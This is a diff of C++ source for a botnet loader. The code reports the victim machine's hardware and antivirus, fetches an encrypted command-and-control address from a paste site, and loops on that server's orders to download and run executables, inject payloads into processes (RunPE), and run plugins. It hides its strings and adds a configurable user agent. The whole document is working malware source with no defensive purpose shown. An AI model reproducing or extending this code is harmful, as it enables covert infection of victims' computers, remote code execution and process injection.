@@ -58,7 +58,7 @@ public:
 			"&netFramework35=" + net35 +
 			"&netFramework4=" + net4 +
 			"&antivirus=" + av +
-			"&botversion=2.1" +
+			"&botversion=" +config.versionID +
 			"&gpuName=" + gpuName +
 			"&cpuName=" + cpuName +
 			"&arch=" + prcessorArchitecture +
@@ -75,7 +75,6 @@ public:
 		std::thread runningPlugin;
 		//Fetch Gate from raw Site
 		std::string gateFromPatebin = XOR::Decrypt(postRequest(config.pastebinUrl, "", "GET"));
-		std::cout << gateFromPatebin;
 		//Main
 		std::string guid = Helpers::GetMachineGUID();
 		std::string finalPost = Client::returnFinalPost(config);
@@ -91,7 +90,7 @@ public:
 
 		while (true) {
 			try {
-				std::string responseFromGate = postRequest(gateFromPatebin, finalPost, "POST");
+				std::string responseFromGate = postRequest(gateFromPatebin, finalPost, "POST", config.useragent);
 				std::cout << responseFromGate;
 				if (responseFromGate.find(OBFUSCATE("dande")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
@@ -100,7 +99,7 @@ public:
 					std::string file((std::string)getenv(OBFUSCATE("TEMP")) + "\\" + random_str + OBFUSCATE(".exe"));
 					Helpers::downloadFile(url, file);
 					std::string started = Helpers::startNewProcess(file);
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
 				}
 				else if (responseFromGate.find(OBFUSCATE("runpe")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
@@ -115,7 +114,7 @@ public:
 					if (runned) {
 						started = OBFUSCATE("injected");
 					}
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
 				}
 				else if (responseFromGate.find(OBFUSCATE("runplugin")) != std::string::npos) {
 					std::vector<std::string> v = Helpers::explode(";", responseFromGate);
@@ -136,7 +135,7 @@ public:
 						started = "success";
 					}
 
-					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST");
+					postRequest(gateFromPatebin, "hwid=" + guid + "&taskstatus=" + started + "&taskid=" + v[0], "POST", config.useragent);
 				}
 				else {
 					if (responseFromGate.find(OBFUSCATE("uninstall")) != std::string::npos) {
